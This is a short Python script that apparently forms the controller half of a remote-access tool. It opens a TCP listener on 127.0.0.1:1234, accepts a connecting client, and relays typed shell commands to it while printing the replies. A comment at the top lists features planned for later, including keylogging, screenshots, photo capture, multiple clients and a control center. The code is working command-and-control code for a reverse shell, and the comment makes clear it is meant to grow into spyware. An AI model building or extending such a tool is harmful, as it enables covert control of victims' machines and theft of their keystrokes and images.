# padding, change directory, present working directory, screenshot, keyloging, photo capture, multiple client, control center

import socket

class server:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.address = (self.ip, self.port)
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.accepting_connections()

    def accepting_connections(self):
        self.server_socket.bind(self.address)
        self.server_socket.listen()
        client_socket, client_address = self.server_socket.accept()
        self.shell(client_socket, client_address)

    def shell(self, client_socket, client_address):
        while True:
            print(f"{client_address}>> ", end='')
            command = input()
            client_socket.send(command.encode())
            while True:
                data = client_socket.recv(1024).decode()
                if data == 'done':
                    break
                print(data)

s = server('127.0.0.1', 1234)
